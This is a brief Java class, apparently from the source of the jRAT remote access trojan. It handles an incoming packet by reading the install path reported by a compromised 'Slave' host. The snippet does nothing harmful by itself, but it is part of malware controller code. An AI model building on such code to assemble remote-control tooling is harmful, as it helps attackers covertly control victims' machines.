package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;

import java.io.DataInputStream;


public class Packet23InitInstallPath extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String line = slave.readLine();
		slave.setServerPath(line);

	}

}
